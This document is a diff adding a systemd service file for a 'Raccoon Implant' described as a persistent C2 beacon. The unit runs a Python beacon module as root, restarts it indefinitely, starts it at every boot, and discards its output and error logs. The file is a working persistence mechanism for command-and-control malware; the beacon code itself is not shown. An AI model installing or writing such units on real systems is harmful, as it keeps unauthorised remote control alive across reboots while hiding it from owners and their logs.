@@ -1,0 +1,27 @@
+[Unit]
+Description=Raccoon Implant — Persistent C2 Beacon
+After=network-online.target
+Wants=network-online.target
+StartLimitIntervalSec=0
+
+[Service]
+Type=simple
+User=root
+WorkingDirectory=/opt/raccoon
+ExecStartPre=/bin/sleep 30
+ExecStart=/opt/raccoon/venv/bin/python -m software.c2.beacon_standalone
+Restart=always
+RestartSec=60
+
+StandardOutput=null
+StandardError=null
+SyslogIdentifier=raccoon-beacon
+
+PrivateTmp=true
+ProtectHome=read-only
+
+Environment="PYTHONPATH=/opt/raccoon"
+Environment="PATH=/opt/raccoon/venv/bin:/usr/local/bin:/usr/bin:/bin"
+
+[Install]
+WantedBy=multi-user.target
